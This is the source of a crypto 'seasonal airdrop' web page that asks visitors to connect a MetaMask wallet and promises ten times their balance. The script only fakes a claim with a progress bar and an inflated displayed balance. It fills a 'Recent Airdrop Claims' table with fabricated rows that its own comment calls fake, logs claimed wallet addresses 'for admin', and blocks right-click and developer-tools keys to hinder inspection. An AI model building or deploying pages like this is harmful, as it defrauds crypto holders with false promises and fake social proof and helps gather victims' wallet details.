<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Joint Seasonal Airdrop 2025</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.8.1/dist/ethers.umd.min.js"></script>
  <style>
    body {
      margin: 0;
      background: #3b0066;
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      overflow-x: hidden;
    }
    header {
      text-align: center;
      padding: 20px;
      background: #4b007a;
    }
    header h1 {
      font-size: 24px;
    }
    header img {
      height: 30px;
      margin: 0 5px;
      vertical-align: middle;
    }
    main {
      max-width: 500px;
      margin: auto;
      background: #5c108c;
      padding: 20px;
      border-radius: 12px;
    }
    input, select, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 6px;
    }
    .info {
      margin-top: 10px;
      padding: 10px;
      background: #7134a7;
      border-radius: 8px;
    }
    .progress-container {
      height: 20px;
      background: #333;
      border-radius: 10px;
      margin-top: 10px;
    }
    .progress-bar {
      height: 100%;
      background: gold;
      width: 0;
      border-radius: 10px;
      transition: width 1s linear;
    }
    #coinCanvas {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      pointer-events: none;
    }
    footer {
      text-align: center;
      margin-top: 20px;
      color: gold;
    }
    footer img {
      height: 25px;
      vertical-align: middle;
    }
    .airdrop-table {
      margin: 40px auto;
      max-width: 800px;
      background: #4b007a;
      border-radius: 12px;
      padding: 10px;
      overflow-x: auto;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      color: white;
    }
    th, td {
      padding: 10px;
      border-bottom: 1px solid #777;
    }
    th {
      background: #3c0066;
    }
    .success-msg {
      color: #00ff88;
      text-align: center;
      font-weight: bold;
    }
    .centered-heading {
      text-align: center;
    }

      .floating-img {
      float: left;
      width: 100px;
      margin-right: 15px;
      margin-bottom: 15px;
    }
    .floating-img img {
      width: 100%;
      border-radius: 8px;
    }

    /* Balloon swing animation */
    .balloon-wrapper {
      display: flex;
      justify-content: center;
      gap: 20px;
      padding: 20px 0;
    }

    .balloon {
      width: 60px;
      height: 80px;
      background-color: transparent;
      border-radius: 50% 50% 45% 45%;
      position: relative;
      animation: swing 2s ease-in-out infinite alternate;
      transform-origin: top center;
    }

    .balloon img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      border-radius: 50%;
      box-shadow: 0 0 12px #fff;
    }

    .balloon::after {
      content: '';
      position: absolute;
      bottom: -20px;
      left: 50%;
      width: 2px;
      height: 20px;
      background: white;
      transform: translateX(-50%);
    }

    @keyframes swing {
      0% { transform: rotate(-5deg); }
      100% { transform: rotate(5deg); }
    }


  </style>
</head>
<body>
<canvas id="coinCanvas"></canvas>

<header>
  <h1>🎈 Welcome to the Web3 Seasonal Crypto Airdrop Portal🎈</h1>  
  <div class="balloon-wrapper">
    <div class="balloon"><img src="images/metamask.png" alt="MetaMask" /></div>
    <div class="balloon"><img src="images/trust wallet.png" alt="Trust Wallet" /></div>
    <div class="balloon"><img src="images/binance.png" alt="Binance" /></div>
  </div>
</header>


<main>
  <button onclick="connectWallet()">Connect Wallet</button>

  <div class="info success-msg" id="connectionMsg">Wallet not connected.</div>
  <div class="info" id="walletInfo">Wallet: --</div>
  <div class="info" id="balanceInfo">Balance: --</div>
  <div class="info" id="tokenValueInfo">Token Value: --</div>

  <label>Enter wallet address manually (optional):</label>
  <input type="text" id="manualAddress" placeholder="0x..." />

  <label for="assetSelect">Select Asset:</label>
  <select id="assetSelect">
    <option value="ETH">Ethereum</option>
    <option value="USDT">Tether</option>
    <option value="BNB">Binance Coin</option>
  </select>

  <button id="claimBtn" onclick="claimAirdrop()" disabled>Claim Airdrop</button>

  <div class="progress-container"><div class="progress-bar" id="airdropProgress"></div></div>
  <h2 class="centered-heading">🎉 Recent Airdrop Claims</h2>
    <p> Minimum Eligible Balance is $100. Airdrop is x10 Wallet Balance </p>

  <section class="airdrop-table">
    <table>
      <thead>
        <tr>
          <th>Name</th>
          <th>Asset</th>
          <th>Value</th>
          <th>Timestamp</th>
        </tr>
      </thead>
      <tbody id="liveTable"></tbody>
    </table>
  </section>

  <footer>&copy; Joint Seasonal Airdrop 2025</footer>

<script>
  const minBalanceThreshold = 0;
  let connectedAddress = "";
  let baseEthPrice = 3000;

  async function connectWallet() {
    if (!window.ethereum) return alert('Wallet not found!');

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      connectedAddress = accounts[0];

      document.getElementById('walletInfo').innerText = 'Wallet: ' + connectedAddress;
      document.getElementById('manualAddress').value = connectedAddress;
      document.getElementById('connectionMsg').innerText = '✅ Wallet connected successfully. Proceed to Claim Seasonal Airdrop!';
      await updateBalance(provider);
    } catch (err) {
      alert("Connection failed: " + err.message);
    }
  }

  async function updateBalance(provider) {
    const balance = await provider.getBalance(connectedAddress);
    const eth = parseFloat(ethers.formatEther(balance));
    const usdValue = (eth * baseEthPrice).toFixed(2);

    document.getElementById('balanceInfo').innerText = `Balance: ${eth.toFixed(6)} ETH`;
    document.getElementById('tokenValueInfo').innerText = `Estimated USD: $${usdValue}`;

    if (parseFloat(usdValue) >= minBalanceThreshold) {
      document.getElementById('claimBtn').disabled = false;
    } else {
      document.getElementById('claimBtn').disabled = true;
      alert(`Balance too low. Minimum $${minBalanceThreshold} required.`);
    }
  }

  function claimAirdrop() {
    const asset = document.getElementById('assetSelect').value;
    const wallet = connectedAddress || document.getElementById('manualAddress').value.trim();
    const timestamp = new Date().toLocaleString();

    if (!wallet) return alert("Wallet address is required.");

    const progressBar = document.getElementById('airdropProgress');
    progressBar.style.width = '0%';

    let progress = 0;
    const duration = 10;
    const interval = setInterval(() => {
      progress++;
      progressBar.style.width = (progress / duration * 100) + '%';
      if (progress >= duration) {
        clearInterval(interval);
        alert("✅ Airdrop claimed! Admin will Approve Airdrop Deposits in 15 minutes. Congratulations!");

        // 🎉 Boost displayed value by x10
        const currentUsd = parseFloat(document.getElementById('tokenValueInfo').innerText.split('$')[1]);
        const boosted = (currentUsd * 10).toFixed(2);
        document.getElementById('tokenValueInfo').innerText = `🎉 New Airdrop USD: $${boosted}`;
        document.getElementById('balanceInfo').innerText = `🎉 Total Boosted Balance: ${(boosted / baseEthPrice).toFixed(6)} ETH`;

        // Clear manual input after 10s
        setTimeout(() => {
          document.getElementById('manualAddress').value = '';
        }, 10000);
      }
    }, 1000);

    // Save claim to localStorage for admin
    const usdValue = document.getElementById('tokenValueInfo').innerText.split('$')[1];
    const claims = JSON.parse(localStorage.getItem("airdropClaims")) || [];

    claims.push({
      wallet,
      walletType: 'metamask',
      asset,
      network: 'Ethereum',
      usdValue,
      timestamp
    });

    localStorage.setItem("airdropClaims", JSON.stringify(claims));
  }

  // 🎲 Fake live table
   const names = ["0xC02aaA39b***", "0A0e5C4F27eA***", "D9083C756Cc2***", "0xBE0eB53F46***", "cd790Cd13851**", "d5EFf43D124***", "0x49048044***", "D57e1C92A77***", "f79988d21F***", "a8fAF74E97e***"];
  const tokens = ["ETH", "USDT", "BNB", "BTC", "AVAX", "SOL"];

  function generateFakeRow() {
    const name = names[Math.floor(Math.random() * names.length)];
    const token = tokens[Math.floor(Math.random() * tokens.length)];
    const value = (Math.random() * 100 + 1000).toFixed(2);
    const timestamp = new Date().toLocaleTimeString();

    return `<tr><td>${name}</td><td>${token}</td><td>$${value}</td><td>${timestamp}</td></tr>`;
  }

  function updateLiveTable() {
    const tableBody = document.getElementById("liveTable");
    let html = "";
    for (let i = 0; i < 10; i++) html += generateFakeRow();
    tableBody.innerHTML = html;
  }

  setInterval(updateLiveTable, 10000);
  updateLiveTable();


  function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }
  // 🎊 Falling Coin Effect
  const canvas = document.getElementById('coinCanvas');
  const ctx = canvas.getContext('2d');
  const img = new Image();
  img.src = 'https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg';
  let coins = [];

  function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }

  function initCoins() {
    coins = [];
    for (let i = 0; i < 40; i++) {
      coins.push({
        x: Math.random() * window.innerWidth,
        y: Math.random() * window.innerHeight,
        r: 20 + Math.random() * 15,
        d: 1 + Math.random() * 2,
        angle: Math.random() * 360,
        speed: 0.5 + Math.random() * 1
      });
    }
  }

  function drawCoins() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    coins.forEach(c => {
      ctx.save();
      ctx.translate(c.x, c.y);
      ctx.rotate((c.angle * Math.PI) / 180);
      ctx.drawImage(img, -c.r / 2, -c.r / 2, c.r, c.r);
      ctx.restore();
      c.y += c.d;
      c.angle += c.speed * 2;
      if (c.y > window.innerHeight) {
        c.y = -50;
        c.x = Math.random() * window.innerWidth;
      }
    });
  }

  resizeCanvas();
  initCoins();
  setInterval(drawCoins, 40);
  window.addEventListener('resize', resizeCanvas);


  // Floating Image Logic
  const floatingImages = [
    './images/airdrop-logo.jpeg',
    './images/airdrop.jpeg',
    './images/airdroppp.jpg',
    './images/metamask air.png',
    
  ];

  let currentFloatingIndex = 0;
  const floatingImg = new Image();
  floatingImg.src = floatingImages[currentFloatingIndex];

  const floatingCanvas = document.createElement('canvas');
  floatingCanvas.id = 'floatingImageCanvas';
  floatingCanvas.style.position = 'fixed';
  floatingCanvas.style.top = 0;
  floatingCanvas.style.left = 0;
  floatingCanvas.style.zIndex = -2;
  floatingCanvas.style.pointerEvents = 'none';
  document.body.appendChild(floatingCanvas);

  const fCtx = floatingCanvas.getContext('2d');
  let floatW = window.innerWidth;
  let floatH = window.innerHeight;
  floatingCanvas.width = floatW;
  floatingCanvas.height = floatH;

  let floatImage = {
    x: Math.random() * floatW,
    y: Math.random() * floatH,
    vx: 1 + Math.random(),
    vy: 1 + Math.random(),
    size: 250 + Math.random() * 30,
  };

  function drawFloatingImage() {
    fCtx.clearRect(0, 0, floatW, floatH);
    fCtx.drawImage(floatingImg, floatImage.x, floatImage.y, floatImage.size, floatImage.size);

    floatImage.x += floatImage.vx;
    floatImage.y += floatImage.vy;

    if (floatImage.x + floatImage.size > floatW || floatImage.x < 0) floatImage.vx *= -1;
    if (floatImage.y + floatImage.size > floatH || floatImage.y < 0) floatImage.vy *= -1;

    requestAnimationFrame(drawFloatingImage);
  }

  floatingImg.onload = () => drawFloatingImage();

  // Cycle images every 10 seconds
  setInterval(() => {
    currentFloatingIndex = (currentFloatingIndex + 1) % floatingImages.length;
    floatingImg.src = floatingImages[currentFloatingIndex];
  }, 10000);

  window.addEventListener('resize', () => {
    floatW = window.innerWidth;
    floatH = window.innerHeight;
    floatingCanvas.width = floatW;
    floatingCanvas.height = floatH;
  });

//floating image logic

  // Disable right-click
  document.addEventListener('contextmenu', function (e) {
    e.preventDefault();
  });

  // Disable common dev tools key combos
  document.addEventListener('keydown', function (e) {
    // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
    if (
      e.keyCode === 123 || // F12
      (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || // Ctrl+Shift+I/J
      (e.ctrlKey && e.key === 'U') || // Ctrl+U
      (e.ctrlKey && e.shiftKey && e.key === 'C') // Ctrl+Shift+C
    ) {
      e.preventDefault();
    }
  });

  // Disable text selection
  document.addEventListener('selectstart', function (e) {
    e.preventDefault();
  });

  // Optional: disable drag
  document.addEventListener('dragstart', function (e) {
    e.preventDefault();
  });

</script>

</body>
</html>
